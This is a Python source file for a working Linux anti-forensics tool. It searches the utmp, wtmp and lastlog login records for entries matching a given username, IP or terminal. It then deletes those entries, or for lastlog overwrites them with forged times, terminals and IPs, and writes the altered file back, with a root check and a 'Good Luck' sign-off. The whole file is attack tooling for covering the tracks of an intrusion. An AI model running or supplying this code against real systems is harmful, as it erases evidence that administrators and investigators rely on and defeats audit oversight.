# -*- coding:utf-8 -*-

import struct
import pwd
import argparse
import sys
import os
import time


def show_logo():
    print("""\033[40;1;36;40m
 \_/    _    \______/
 | |   | |   / _0_0_\\
 | |   | |  | | ' '
 | |   | |  | | \033[40;1;31;40mlogs\033[0m\033[40;1;33;40m <{(= \033[0mTr0y \033[40;1;36;40m
 | |___| |__| |_'_'__
 |_____|_____\______/
\033[0m""")


def wrapper(func):
    def _wrapper():
        try:
            matched, tamperlog = func()
            if matched:
                print_pro(put_color("[*]found matched log in ", "yellow")+FILENAME)
                for i in matched:
                    print_pro(put_color(i, "white"))

                if vars(__builtins__).get('raw_input', input)(
                        put_color("\n[!]tamper them?", "white")+" [y]/n > ") != "n":
                    return tamperlog
                else:
                    print_pro(put_color("  [!]aborted", "yellow"))
            else:
                print_pro(put_color("[*]records not found!", "green"))
        except Exception as e:
            print_pro("%s %s %s" % (put_color("\n[X]match log:", "red"), FILENAME, put_color("failed", "red")))
            print_pro("  [-]reason: %s" % put_color(str(e), "white"))
    return _wrapper


@wrapper
def match_xmtplog():
    '''
    open xtmp/lastlog logfile and search for record.
    return **unmatched** record.
    '''

    tamperlog = b''
    matched = []
    with open(FILENAME, 'rb') as fp:
        while 1:
            bytes = fp.read(SIZE)
            if not bytes:
                break

            record = [str(i) if type(i) == int else i.replace(b"\x00", b"") for i in struct.unpack(STRUCT, bytes)]
            record = [i if i else b"[empty]" for i in record]
            if all([compare(CLUES[0], record[4]),  # search username
                    compare(CLUES[1], record[5]),  # search ip
                    compare(CLUES[2], record[2])]):  # search ttyname
                matched.append("  [-]"+b" ".join(
                    [record[4], record[2], record[5]]
                ).decode("utf8"))
                continue

            tamperlog += bytes

    return matched, tamperlog


def tamper_record(record):
    mtime, mtty, mip = int(record[0]), record[1], record[2]
    mtime_str, mtty_str, mip_str = put_color(
        time.strftime(
            "%Y-%m-%d %H:%M:%S", time.localtime(int(record[0]))
        ), "white"), put_color(record[1].decode("utf8"), "white"), put_color(record[2].decode("utf8"), "white")

    if MODE and (MTIME == None) or (type(MTIME) == int and int(MTIME)):
        if MTIME:
            mtime = int(MTIME)
            mtime_str = put_color(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(mtime)), "cyan")

        if MTTY:
            mtty = MTTY.encode("utf8")
            mtty_str = put_color(MTTY, "cyan")

        if MIP:
            mip_str = put_color(MIP, "cyan")
            mip = MIP.encode("utf8")

    else:
        mtime, mtty, mip = 0, b"\x00", b"\x00"
        mtime_str = put_color("1970-01-01 08:00:00", "cyan")
        mtty_str = mip_str = put_color("[empty]", "cyan")
        mip_str = put_color("[empty]", "cyan")

    # tamper_bytes = struct.pack(STRUCT, mtime, "{:\x00<32}".format(
    #    mtty).decode("utf8"), "{:\x00<64}".format(mip).decode("utf8"))
    tamper_bytes = struct.pack(STRUCT, mtime, mtty, mip)
    return tamper_bytes, [USERNAME,  mtty_str, mtime_str, mip_str]


@wrapper
def match_lastlog():
    matched = []
    try:
        pw = pwd.getpwnam(USERNAME)
        print_pro(put_color("  [-]user found", "gray"), debug=True)
    except:
        print_pro(put_color("[!]user not found!", "yellow"))
        return [], ""

    with open(FILENAME, 'rb') as fp:
        bytes = fp.read()
        fp.seek(SIZE*pw.pw_uid)
        matched_bytes = fp.read(SIZE)
        if matched_bytes:
            record = [str(i) if type(i) == int else i.replace(b"\x00", b"")
                      for i in struct.unpack(STRUCT, matched_bytes)]
            record = [i if i else b"[empty]" for i in record]
            tamperlog, tampered = tamper_record(record)
            tamperlog = bytes.replace(matched_bytes, tamperlog)

            if int(record[0]):
                matched = ["  --- "+" ".join([
                    USERNAME,
                    record[1].decode("utf8"),  # ttyname
                    time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(record[0]))),  # time
                    record[2].decode("utf8"),  # ip
                ])+"\n  +++ "+" ".join(tampered)]

    return matched, tamperlog


def tamper_log(contents):
    '''
    tamper the log files.
    '''
    try:
        with open(FILENAME, 'wb') as fp:
            fp.write(contents)

        print_pro(put_color("  [-]tamper records: success", "green")+check_cmd)
    except Exception as e:
        print_pro(put_color("\n[X]tamper log: failed", "red"))
        print_pro("    [-]reason: %s" % put_color(str(e), "white"))


def compare(a, b):
    '''
    unassigned == None == True
    '''

    return a == None or a.encode('utf-8') == b


def put_color(string, color):
    colors = {
        u"gray": "2",
        u"red": "31",
        u"green": "32",
        u"yellow": "33",
        u"blue": "34",
        u"pink": "35",
        u"cyan": "36",
        u"white": "37",
    }

    return u"\033[40;1;%s;40m%s\033[0m" % (colors[color], string)


def print_pro(msg, debug=False):
    '''
    control output

    level 0: important info
    level 1: normal info
    level 2: debug info
    '''

    if debug and not DEBUG:
        return

    print(msg)


show_logo()
PATH = [
    "/var/run/utmp",
    "/var/log/wtmp",
    "/var/log/lastlog"
]

cmds = {
    0: "w",
    1: "last",
    2: "lastlog",
}


parser = argparse.ArgumentParser()
parser.add_argument('-l', '--log', type=int, required=True,
                    choices=[0, 1, 2], help='assign log file: [0:utmp]; 1:wtmp; 2:lastlog')

parser.add_argument('-u', '--username', help='match records based on username')
parser.add_argument('-i', '--ip', help='match records based on ip')
parser.add_argument('-t', '--ttyname', help='match records based on ttyname')

parser.add_argument('-f', '--filename',
                    help='if log filename is not in ["utmp", "wtmp", "lastlog"], give me the path and filename')
parser.add_argument('-d', '--debug', action="store_true",
                    help='debug mode')

parser.add_argument('-m', "--mode", action="store_true", help='**just for lastlog** clear or modify? default: clear')
parser.add_argument(
    '-mtime', help='**just for lastlog and --mode is turn on** assign time. if you want "1997-01-01 08:00:00", mtime is "1997-01-01 08:00:00"')
parser.add_argument(
    '-mstime', help='**just for lastlog and --mode is turn on** assign time. if you want "1997-01-01 08:00:00", mstime is 0')
parser.add_argument('-mtty', help='**just for lastlog and --mode is turn on** assign ttyname, like: pts/1')
parser.add_argument('-mip', help='**just for lastlog and --mode is turn on** assign ip, like: 192.168.1.1')


args = parser.parse_args()
DEBUG = args.debug

print_pro(put_color("[+]analyse parameter", "gray"), debug=True)
LOG = args.log
print_pro(put_color("  [-]tamper file: "+["utmp", "wtmp", "lastlog"][LOG], "gray"), debug=True)
check_cmd = "\n  [-]check it with command: " + put_color(cmds[LOG], "white")

USERNAME = args.username
IP = args.ip
TTYNAME = args.ttyname

FILENAME = args.filename if args.filename else PATH[LOG]
if FILENAME:
    location = FILENAME
print_pro(put_color("  [-]location: "+location, "gray"), debug=True)

MODE = args.mode
print_pro(put_color("  [-]mode: "+["clear", "modify"][MODE], "gray"), debug=True)


# use mtime by default
MTIME = int(time.mktime(
    time.strptime(args.mtime, "%Y-%m-%d %H:%M:%S")
)) if args.mtime else args.mstime if args.mstime else args.mstime

MTTY = args.mtty
MIP = args.mip


LASTLOG_STRUCT = 'I32s256s'
LASTLOG_STRUCT_SIZE = struct.calcsize(LASTLOG_STRUCT)

XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)

STRUCT = [LASTLOG_STRUCT, XTMP_STRUCT][LOG in [0, 1]]
SIZE = [LASTLOG_STRUCT_SIZE, XTMP_STRUCT_SIZE][LOG in [0, 1]]


if not os.geteuid() == 0:
    print_pro(put_color("  [-]is root: "+"no", "gray"), debug=True)
    if vars(__builtins__).get('raw_input', input)(put_color("[!]you are NOT ROOT", "red")+"\n  [-]continue? y/[n] > ") != "y":
        sys.exit(put_color("  [!]aborted", "yellow")+put_color("\n\nGood Luck :)", "green"))
    else:
        print_pro(put_color("  [-]as you wish\n", "yellow"))
else:
    print_pro(put_color("  [-]is root: "+"yes", "gray"), debug=True)

print_pro(put_color("[+]analyse logfile", "gray"), debug=True)
if LOG in [0, 1]:
    CLUES = [USERNAME, IP, TTYNAME]
    if not any(CLUES):  # CLUES is empty!
        sys.exit(put_color("[X]give me a username or ip or ttyname", "red"))

    # 0: change command: last
    # 1: change command: lastlog
    new_data = match_xmtplog()
    if new_data != None:
        tamper_log(new_data)
else:
    # 2: change command: w
    if not USERNAME:  # CLUES is username!
        sys.exit(put_color("[X]give me a username", "red"))

    new_data = match_lastlog()
    if new_data != None:
        tamper_log(new_data)

print_pro(put_color("\nGood Luck :)", "green"))
